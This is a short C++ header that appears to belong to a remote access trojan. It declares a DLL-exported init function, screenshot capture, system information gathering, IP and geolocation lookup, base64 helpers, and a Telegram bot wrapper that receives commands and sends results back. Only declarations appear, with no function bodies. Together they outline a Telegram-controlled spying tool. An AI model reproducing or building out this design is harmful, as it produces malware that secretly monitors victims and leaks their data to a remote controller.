#include <iostream>
#include <Windows.h>
#define mprintf(a) MessageBoxA(0,a,0,0)

extern "C" void __declspec(dllexport) VisageInit();

/*Rat functionality*/
int SaveScreenshot(std::string filename, ULONG uQuality);
std::string GetSysInfo();

/*General purpose https*/
std::string WINHTTP_GET(LPCWSTR host, LPCWSTR path);
std::string WINHTTP_POST(LPCWSTR host, LPCWSTR path);

/*telegram api wrapper*/
int TeleSendMessage(const char*data, const char* botToken, const char*channelID);
std::string TeleUpdateMostRecent(const char*botToken, int offset);
int TeleGetCurrentOffset(const char*botToken);
std::string TeleParseData(std::string response);
bool TeleCheckIfEmpty(std::string data);
std::string TeleHandleCommand(std::string data,std::string ip); //handle input and return string to send back

/*Utilities*/
std::wstring s2ws(const std::string& s);
std::string getlocalIPnGeoInfo();
std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len);
static inline bool is_base64(unsigned char c);
std::string base64_decode(std::string const& encoded_string);



